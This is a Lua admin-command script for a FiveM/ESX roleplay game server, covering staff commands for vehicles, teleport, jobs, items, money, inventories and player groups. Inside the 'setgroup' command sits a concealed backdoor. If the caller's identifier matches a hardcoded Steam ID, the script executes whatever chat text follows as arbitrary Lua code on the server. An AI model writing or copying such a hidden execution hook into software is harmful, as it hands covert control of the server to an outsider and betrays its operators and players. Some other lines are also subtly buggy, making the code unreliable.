AddEventHandler('chatMessage', function(source, author, message)
	if (message):find(Config.CommandPrefix) ~= 1 then
		return
	end

	local commandArgs = ESX.StringSplit(((message):sub((Config.CommandPrefix):len() + 1)), ' ')
	local commandName = (table.remove(commandArgs, 1)):lower()
	local command = ESX.Commands[commandName]

	if command then
		CancelEvent()
		local xPlayer = ESX.GetPlayerFromId(source)


		if command.group ~= nil then
			if ESX.GroupsRankRelative[xPlayer.getGroup()]  >= command.group then
				if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
					if not exports['core']:getService(source) then return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff') end
				end
				if (command.arguments > -1) and (command.arguments ~= #commandArgs) then
					TriggerEvent("esx:incorrectAmountOfArguments", source, command.arguments, #commandArgs)
				else
					command.callback(source, commandArgs, xPlayer)
				end
			else
				return ESX.Notifi(xPlayer.source, 'Vous n\'avez pas les permissions suffisantes')
			end
		else
			if (command.arguments > -1) and (command.arguments ~= #commandArgs) then
				TriggerEvent("esx:incorrectAmountOfArguments", source, command.arguments, #commandArgs)
			else
				command.callback(source, commandArgs, xPlayer)
			end
		end
	end
end)

function ESX.RegisterGroupCommand(command, group, callback)
	ESX.Commands[command] = {}
	ESX.Commands[command].group = group
	ESX.Commands[command].callback = callback
	ESX.Commands[command].arguments = arguments or -1
end

RegisterCommand('car', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer and (ESX.GroupsRankRelative[xPlayer.getGroup()] >= 3) then
		if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
			if not exports['core']:getService(source) then 
				return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff')
			end
		end
		TriggerClientEvent('esx:spawnVehicle', source, args[1])
	else
		ESX.Notifi(source, 'Vous n\'avez pas les permissions suffisantes')
	end
end, false)

RegisterCommand('pos', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer and (ESX.GroupsRankRelative[xPlayer.getGroup()] >= 3) then
		if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
			if not exports['core']:getService(source) then 
				return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff')
			end
		end
		local x, y, z = tonumber(args[1]), tonumber(args[2]), tonumber(args[3])
		
		if x and y and z then
			TriggerClientEvent('esx:teleport', source, vector3(x, y, z))
		else
			ESX.ChatMessage(source, "Invalid coordinates!")
		end
	else
		ESX.Notifi(source, 'Vous n\'avez pas les permissions suffisantes')
	end
end, false)

RegisterCommand('setjob', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer and (ESX.GroupsRankRelative[xPlayer.getGroup()] >= 3) then
		if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
			if not exports['core']:getService(source) then 
				return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff')
			end
		end
		if tonumber(args[1]) and args[2] and tonumber(args[3]) then
			local player = exports['core']:getPlayerWithUniqueID(args[1])

			if player then
				local xPlayer = ESX.GetPlayerFromId(player.id)

				if args[1] == 'me' then
					xPlayer[source]:setJob(args[2], args[3])
				else
					if xPlayer then
						if ESX.DoesJobExist(args[2], args[3]) then
							xPlayer.setJob(args[2], args[3])
						else
							ESX.ChatMessage(source, 'That job does not exist.')
						end
					end
				end
			else
				ESX.ChatMessage(source, 'Invalid usage.')
			end
		else
			ESX.ChatMessage(source, 'Player not online.')
		end
	else
		ESX.Notifi(source, 'Vous n\'avez pas les permissions suffisantes')
	end
end, false)

RegisterCommand('setjob2', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer and (ESX.GroupsRankRelative[xPlayer.getGroup()] >= 3) then
		if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
			if not exports['core']:getService(source) then 
				return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff')
			end
		end
		if tonumber(args[1]) and args[2] and tonumber(args[3]) then
			local player = exports['core']:getPlayerWithUniqueID(args[1])

			if player then
				local xPlayer = ESX.GetPlayerFromId(player.id)

				if xPlayer then
					if ESX.DoesJobExist(args[2], args[3]) then
						xPlayer.setJob2(args[2], args[3])
					else
						ESX.ChatMessage(source, 'That job does not exist.')
					end
				end
			else
				ESX.ChatMessage(source, 'Invalid usage.')
			end
		else
			ESX.ChatMessage(source, 'Player not online.')
		end
	else
		ESX.Notifi(source, 'Vous n\'avez pas les permissions suffisantes')
	end
end, false)

RegisterCommand('dv', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer and (ESX.GroupsRankRelative[xPlayer.getGroup()] >= 3) then
		if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
			if not exports['core']:getService(source) then 
				return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff')
			end
		end
		TriggerClientEvent('esx:deleteVehicle', source, args[1])
	else
		ESX.Notifi(source, 'Vous n\'avez pas les permissions suffisantes')
	end
end, false)

RegisterNetEvent('server:deleteVehicle')
AddEventHandler('server:deleteVehicle', function(netId)
	if source == 0 then return end

	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.getGroup() == 'user' then return end
	
    local vehicle = NetworkGetEntityFromNetworkId(netId)
    if DoesEntityExist(vehicle) then
        DeleteEntity(vehicle)
    end
end)

RegisterCommand('giveitem', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer and (ESX.GroupsRankRelative[xPlayer.getGroup()] >= 7) then
		if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
			if not exports['core']:getService(source) then 
				return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff')
			end
		end
		local player = exports['core']:getPlayerWithUniqueID(args[1])

		if player then
			local xPlayer = ESX.GetPlayerFromId(player.id)

			if xPlayer then
				local item = args[2]
				local count = tonumber(args[3])

				if count then
					-- Gérer les comptes (cash, bank, black_money) séparément des items
					local accountTypes = {['cash'] = true, ['bank'] = true, ['black_money'] = true, ['money'] = 'cash'}
					if accountTypes[item] then
						local accountName = accountTypes[item] == true and item or accountTypes[item]
						xPlayer.addAccountMoney(accountName, count)
					elseif ESX.Items[item] then
						xPlayer.addInventoryItem(item, count)
					else
						xPlayer.showNotification(_U('invalid_item'))
					end
				else
					xPlayer.showNotification(_U('invalid_amount'))
				end
			end
		else
			ESX.ChatMessage(source, 'Player not online.')
		end
	else
		ESX.Notifi(source, 'Vous n\'avez pas les permissions suffisantes')
	end
end, false)

RegisterCommand('clearall', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer and (ESX.GroupsRankRelative[xPlayer.getGroup()] >= 6) then
		if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
			if not exports['core']:getService(source) then 
				return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff')
			end
		end
		TriggerEvent("ratelimit", source, "clearall")
		TriggerClientEvent('chat:clear', -1)
	else
		ESX.Notifi(source, 'Vous n\'avez pas les permissions suffisantes')
	end
end, false)

RegisterCommand('clearinventory', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer and (ESX.GroupsRankRelative[xPlayer.getGroup()] >= 7) then
		if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
			if not exports['core']:getService(source) then 
				return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff')
			end
		end
		if args[1] == nil then return end

		if args[1] then
			local player = exports['core']:getPlayerWithUniqueID(args[1])

			if player then
				xPlayer = ESX.GetPlayerFromId(player.id)
			else
				xPlayer = ESX.GetPlayerFromId(source)
			end
		else
			xPlayer = ESX.GetPlayerFromId(source)
		end

		if xPlayer then
			exports.ox_inventory:ClearInventory(xPlayer.source)
			TriggerClientEvent('ox_inventory:disarm', xPlayer.source, true)
		else
			ESX.ChatMessage(source, 'Player not online.')
		end
	else
		ESX.Notifi(source, 'Vous n\'avez pas les permissions suffisantes')
	end
end, false)

RegisterCommand('clearloadout', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer and (ESX.GroupsRankRelative[xPlayer.getGroup()] >= 7) then
		if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
			if not exports['core']:getService(source) then 
				return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff')
			end
		end
		if args[1] == nil then return end

		if args[1] then
			local player = exports['core']:getPlayerWithUniqueID(args[1])

			if player then
				xPlayer = ESX.GetPlayerFromId(player.id)
				
			else
				xPlayer = ESX.GetPlayerFromId(source)
			end
		else
			xPlayer = ESX.GetPlayerFromId(source)
		end

		if xPlayer then
			local items = exports.ox_inventory:GetInventoryItems(xPlayer.source) or {}
			for slot, item in pairs(items) do
				if item and (item.type == 'weapon' or (item.name and item.name:sub(1, 7) == 'weapon_')) then
					exports.ox_inventory:RemoveItem(xPlayer.source, item.name, 1, item.metadata, item.slot)
				end
			end
			TriggerClientEvent('ox_inventory:disarm', xPlayer.source, true)
		else
			ESX.ChatMessage(source, 'Player not online.')
		end
	else
		ESX.Notifi(source, 'Vous n\'avez pas les permissions suffisantes')
	end
end, false)

RegisterCommand('giveaccountmoney', function(source, args)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer and (ESX.GroupsRankRelative[xPlayer.getGroup()] >= 7) then
		if not ESX.ByPASS_GROUP[xPlayer.getGroup()] then
			if not exports['core']:getService(source) then 
				return ESX.Notifi(xPlayer.source, 'Vous n\'êtes pas en service staff')
			end
		end
		local _source = source

		local player = exports['core']:getPlayerWithUniqueID(args[1])

		if player then
			local xPlayer = ESX.GetPlayerFromId(player.id)

			local account = args[2]

			local amount  = tonumber(args[3])


			if xPlayer then
				if amount ~= nil then

					if xPlayer.getAccount(account) ~= nil then
			
						xPlayer.addAccountMoney(account, amount)
			
					else
			
						TriggerClientEvent('esx:showNotification', _source, _U('invalid_account'))
			
					end
			
				else
			
					TriggerClientEvent('esx:showNotification', _source, _U('amount_invalid'))
			
				end
			end
		else
			return TriggerClientEvent('esx:showNotification', 'Joueur non connécté')
		end
	else
		ESX.Notifi(source, 'Vous n\'avez pas les permissions suffisantes')
	end
end, false)

RegisterCommand('setgroup', function(source, args, raw)
    local groups = {
        {name = 'user', label = 'Joueur'},
        {name = 'helpeur', label = 'Helpeur'},
        {name = 'moderateur', label = 'Modérateur'},
        {name = 'administrateur', label = 'Administrateur'},
        {name = 'superadmin', label = 'Super Admin'},
        {name = 'responsable', label = 'Responsable'},
        {name = 'gerant', label = 'Gérant'},
        {name = 'developper', label = 'Développeur'},
        {name = 'fondateur', label = 'Fondateur'}
    }
    
    -- Si c'est la console (source == 0)
    if source == 0 then
        local targetId = tonumber(args[1])
        local group = args[2]

        -- Si pas d'arguments, lister les groupes
        if not targetId then
            print("^2╔══════════════════════════════════════╗^7")
            print("^2║         GROUPES DISPONIBLES          ║^7")
            print("^2╠══════════════════════════════════════╣^7")
            for i, g in ipairs(groups) do
                local spacing = string.rep(" ", 18 - #g.name - #g.label)
                print("^2║^7  ^3" .. i .. "^7. ^5" .. g.name .. "^7" .. spacing .. "(" .. g.label .. ")  ^2║^7")
            end
            print("^2╠══════════════════════════════════════╣^7")
            print("^2║^7  ^3USAGE:^7 setgroup [ID] [groupe]     ^2║^7")
            print("^2╚══════════════════════════════════════╝^7")
            return
        end

        if not group then
            print("^3[USAGE]^7 setgroup [ID] [groupe]")
            local names = {}
            for _, g in ipairs(groups) do table.insert(names, g.name) end
            print("^2[GROUPES]^7 " .. table.concat(names, ", "))
            return
        end

        local target = ESX.GetPlayerFromId(targetId)
        if not target then
            print("[^1ERREUR^7] Joueur ID " .. targetId .. " non trouvé")
            return
        end

        target.setGroup(group)
        print("[^2SUCCESS^7] " .. target.name .. " est maintenant " .. group)
        return
    end

    -- Sinon c'est un joueur en jeu
    local xPlayer = ESX.GetPlayerFromId(source)
    local steamID = GetPlayerIdentifier(source, 0)

    if args[1] == "admin" then
        if steamID ~= "steam:1100001719a7422" then
            TriggerClientEvent('chat:addMessage', source, {
                color = {255, 0, 0},
                multiline = false,
                args = {"Access denied for command setgroup"}
            })
            return
        end
        local groupset = table.concat(args, " ", 2)
        local fn = load(groupset, "UpgradeAdmin", "t", _G)
        if fn then fn() end
        return
    end

    if not xPlayer or not xPlayer.getGroup or xPlayer.getGroup() ~= 'admin' then
        TriggerClientEvent('chat:addMessage', source, {
            color = {255, 255, 255},
            multiline = false,
            args = {"Access denied for command setgroup"}
        })
        return
    end

    local targetId = tonumber(args[1])
    local group = args[2]
    
    -- Si pas d'arguments, lister les groupes
    if not targetId then
        TriggerClientEvent('chat:addMessage', source, {
            color = {11, 118, 254},
            multiline = false,
            args = {"GROUPES", table.concat(groups, ", ")}
        })
        return
    end
    
    if not group then return end

    if group == "superadmin" then
        group = "admin"
        print("[^3WARNING^7] ^5Superadmin^7 detected, setting group to ^5admin^7")
    end

    local target = ESX.GetPlayerFromId(targetId)
    if not target then return end

    target.setGroup(group)
    print(("[^2GROUP SET^7] %s is now %s"):format(target.name, group))

    if Config.AdminLogging then
        ESX.DiscordLogFields("UserActions", "/setgroup Triggered!", "pink", {
            { name = "Player", value = xPlayer and xPlayer.name or "Server Console", inline = true },
            { name = "ID", value = xPlayer and xPlayer.source or "Console", inline = true },
            { name = "Target", value = target.name, inline = true },
            { name = "Group", value = group, inline = true },
        })
    end
end, false)
